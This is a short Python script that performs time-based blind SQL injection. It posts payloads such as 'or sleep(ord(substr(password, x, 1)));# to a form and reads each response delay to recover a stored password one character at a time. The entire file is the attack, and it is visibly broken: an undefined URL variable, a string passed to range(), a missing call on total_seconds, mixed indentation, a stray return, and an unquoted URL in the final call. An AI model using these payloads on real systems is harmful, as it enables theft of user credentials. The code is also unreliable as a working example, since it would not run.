import requests


times = []
answer = "Kicking off the attempt"
cookies = {'cookie name': 'Cookie value'}

payload = {'injection': '\'or sleep char_length(password);#', 'Submit': 'submit'}
req = requests.post(url, data=payload, cookies=cookies)
firstresponsetime = str(req.elapsed)

for x in range(1, firstresponsetime):
	payload = {'injection': '\'or sleep(ord(substr(password, '+str(x)+', 1)));#', 'Submit': 'submit'}
	req = requests.post('<target url>', data=payload, cookies=cookies)
	responsetime = req.elapsed.total_seconds
	a = chr(responsetime)
		times.append(a)
		answer = ''.join(times)
return answer

averagetimer(http://google.com)